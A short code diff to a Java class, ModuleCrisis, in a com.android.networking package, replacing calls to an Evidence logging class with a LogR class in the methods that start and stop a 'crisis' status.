@@ -14,7 +14,8 @@ import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.conf.ConfigurationException;
-import com.android.networking.evidence.Evidence;
+
+import com.android.networking.evidence.LogR;
 import com.android.networking.util.Check;
 
 public class ModuleCrisis extends BaseModule {
@@ -37,13 +38,13 @@ public class ModuleCrisis extends BaseModule {
 	@Override
 	public void actualStart() {
 		Status.self().startCrisis();
-		Evidence.info(Messages.getString("8.0")); //$NON-NLS-1$
+		LogR.info(Messages.getString("8.0")); //$NON-NLS-1$
 	}
 
 	@Override
 	public void actualStop() {
 		Status.self().stopCrisis();
-		Evidence.info(Messages.getString("8.2")); //$NON-NLS-1$
+		LogR.info(Messages.getString("8.2")); //$NON-NLS-1$
 	}
 
 	@Override
